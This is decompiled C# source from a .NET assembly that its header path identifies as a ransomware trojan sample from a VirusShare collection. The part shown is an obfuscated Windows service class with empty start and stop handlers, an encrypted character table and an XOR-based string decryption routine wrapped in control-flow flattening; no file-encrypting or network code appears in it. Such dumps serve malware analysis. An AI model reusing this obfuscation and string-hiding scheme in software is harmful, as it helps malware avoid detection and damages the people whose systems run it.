// Decompiled with JetBrains decompiler
// Type: Ⴃ.ႷႳ
// Assembly: mac, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 4DC2FD3D-9120-41A8-AE25-CC48D06B9902
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00090-msil\HEUR-Trojan-Ransom.Win32.Generic-4340105078ffe071abe405ad3dc31e12fd66187057ce4929d7c0f635218805af.exe

using System;
using System.ComponentModel;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.ServiceProcess;
using System.Text;

namespace Ⴃ
{
  internal sealed class ႷႳ : ServiceBase
  {
    private ႤႳ.Ⴄ Ⴅ = new ႤႳ.Ⴄ();
    private static readonly object Ⴍ;
    private static readonly object Ⴀ = (object) new char[120]
    {
      '뛔',
      '뛞',
      '뛔',
      '녃',
      '財',
      '겝',
      '菂',
      '阚',
      '륣',
      '박',
      'ꃡ',
      '넔',
      '貥',
      '縦',
      '縯',
      '縧',
      '廩',
      '熗',
      '環',
      '桃',
      '秬',
      '䐔',
      '搨',
      '䬰',
      '床',
      '般',
      '舥',
      '舮',
      '薷',
      '로',
      '頵',
      '뜼',
      'ꊺ',
      '跞',
      '袭',
      '鑏',
      '藜',
      '木',
      '朡',
      '末',
      '䟠',
      '梘',
      '涾',
      '煍',
      '惢',
      '崚',
      '紦',
      '刾',
      '䞄',
      '豍',
      '豄',
      '豉',
      '话',
      '똺',
      '陔',
      '륝',
      '곛',
      '莿',
      '蛌',
      '騮',
      '讽',
      'ฦ',
      'ร',
      'ร',
      '\u09B1',
      '㐧',
      'ᐞ',
      '㬓',
      '\u2EF4',
      'ǋ',
      'Ǌ',
      'Ǎ',
      'ㆇ',
      'ퟧ',
      'ퟯ',
      'ퟠ',
      '\uED92',
      '췾',
      '\uE2F7',
      '\uF771',
      '\uD815',
      '\uDD66',
      '솄',
      '퀗',
      '覟',
      '視',
      '覗',
      '蘪',
      '荝',
      '\u9FFC',
      '蹟',
      '뎲',
      '鎕',
      '벞',
      '꤅',
      '虈',
      '\uF695',
      '\uF69C',
      '\uF69C',
      '쳤',
      '\uECD8',
      '쎃',
      '혉',
      '兩',
      'ﰐ',
      '\uE0E1',
      '\uF153',
      '첂',
      '\uEFBF',
      '\uEFB6',
      '\uEFB5',
      '\uE008',
      '\uE57D',
      '隆',
      '\uE87F',
      '햒',
      '\uF5B5',
      '\uDABE',
      '켥',
      '\uE068'
    };
    private static readonly Array Ⴓ;
    internal static ႷႳ.Ⴗ Ⴈ;

    public ႷႳ() => this.Ⴃ();

    protected override void OnStart([In] string[] obj0)
    {
    }

    protected override void OnStop()
    {
    }

    [SpecialName]
    internal static int Ⴐ() => ႥႤ.Ⴓ() & (int) byte.MaxValue;

    protected override void Dispose([In] bool obj0)
    {
      byte[] ⴐ = ႷႨ.Ⴐ;
      int num = 3;
      while (true)
      {
        switch (num)
        {
          case 0:
          case 1:
            goto label_4;
          case 2:
          case 5:
            goto label_5;
          case 4:
            goto label_6;
          case 6:
            num = this.Ⴅ.Ⴄ == null ? 2 : (int) ⴐ[56];
            continue;
          default:
            num = !obj0 ? 2 : 6;
            continue;
        }
      }
label_6:
      return;
label_4:
      this.Ⴅ.Ⴄ.Dispose();
label_5:
      base.Dispose(obj0);
    }

    private void Ⴃ()
    {
      this.Ⴅ.Ⴄ = (object) new Container() as IContainer;
      ႳႰ.Ⴄ<ServiceBase, string>((ServiceBase) this, ႭႭ.Ⴈ(typeof (ႳႣ.ႣႷ), 13L, 7, 1951761797), (short) 426, 'ǂ');
    }

    static ႷႳ()
    {
      char[] chArray = new char[8]
      {
        char.MinValue,
        char.MinValue,
        char.MinValue,
        char.MinValue,
        char.MinValue,
        char.MinValue,
        'ޣ',
        char.MinValue
      };
      chArray[1] = '྄';
      chArray[2] = '\u20FF';
      chArray[3] = '㕳';
      chArray[5] = '㩄';
      chArray[0] = '\u0AF3';
      chArray[7] = 'ᘆ';
      chArray[4] = '᩼';
      ႷႳ.Ⴓ = (Array) new string[11];
      ႷႳ.Ⴍ = (object) chArray;
      ႳႣ.Ⴅ();
    }

    internal static string Ⴅ([In] string obj0, [In] int obj1, [In] int obj2, [In] byte obj3)
    {
      byte[] ⴐ = ႷႨ.Ⴐ;
      byte[] ⴍ1 = ႣႣ.Ⴍ;
      char[] ⴗ = ႷႼ.Ⴗ;
label_3:
      int index1 = obj1 ^ 1114476728 ^ obj2;
      object ⴀ = ႷႳ.Ⴀ;
      char[] chArray1 = (char[]) ⴀ;
      int num1 = (int) chArray1[index1];
      int index2 = (int) chArray1[index1 + 2] ^ num1;
      int num2 = 9;
      ICloneable cloneable;
      int index3;
      Array array;
      object obj4;
      object obj5;
      char ch;
      int num3;
      int num4;
      int length;
      int num5;
      while (true)
      {
        switch (num2)
        {
          case 0:
            goto label_3;
          case 1:
            goto label_5;
          case 2:
            num2 = (num3 & 32) == 0 ? (int) ⴍ1[202] - 48 : (int) ⴗ[166] - 8855;
            continue;
          case 3:
            num5 = 1;
            num2 = (int) ⴐ[108];
            continue;
          case 4:
            char[] chArray2 = (char[]) ⴀ;
            char[] ⴍ2 = (char[]) ႷႳ.Ⴍ;
            index3 = index1;
            array = (Array) ⴍ2;
            obj4 = (object) chArray2;
            goto case 14;
          case 5:
          case 13:
            num2 = num5 <= num4 ? 16 : (int) ⴍ1[34] - (int) ⴍ1[10];
            continue;
          case 6:
            cloneable = (ICloneable) ((StringBuilder) obj5).ToString();
            ((string[]) ႷႳ.Ⴓ)[index2] = (string) cloneable;
            num2 = (int) ⴍ1[107] - 109;
            continue;
          case 7:
            goto label_18;
          case 8:
            ++num5;
            num2 = (int) ⴐ[449] + 0;
            continue;
          case 9:
            num2 = (string) (cloneable = (ICloneable) ((string[]) ႷႳ.Ⴓ)[index2]) == null ? (int) ⴍ1[11] : (int) ⴐ[56];
            continue;
          case 10:
            index3 += 3;
            num4 = num3 & 31 | (num3 & 65472) >> 1;
            num2 = 2;
            continue;
          case 11:
            obj5 = (object) new StringBuilder();
            ch = (obj4 as char[])[index3];
            num3 = (int) ((char[]) obj4)[index3 + 1] ^ (int) ch;
            num2 = 10;
            continue;
          case 14:
            num2 = (int) ⴐ[477] - 114;
            continue;
          case 15:
            num4 = num4 << 15 | (int) ((char[]) obj4)[index3++] ^ (int) ch;
            num2 = 17;
            continue;
          case 16:
            (obj5 as StringBuilder).Append((char) ((uint) ch ^ (uint) (obj4 as char[])[index3 + num4 - num5] ^ (uint) ((char[]) array)[(num5 + index3 + 17) % length]));
            num2 = (int) ⴍ1[19];
            continue;
          case 17:
            length = ((char[]) array).Length;
            goto case 3;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (ႷႳ.Ⴅ);
            num2 = 0;
            continue;
        }
      }
label_5:
      return (string) cloneable;
label_18:
      return cloneable as string;
    }

    [StructLayout(LayoutKind.Explicit, Size = 240, Pack = 1)]
    private struct Ⴗ
    {
    }
  }
}
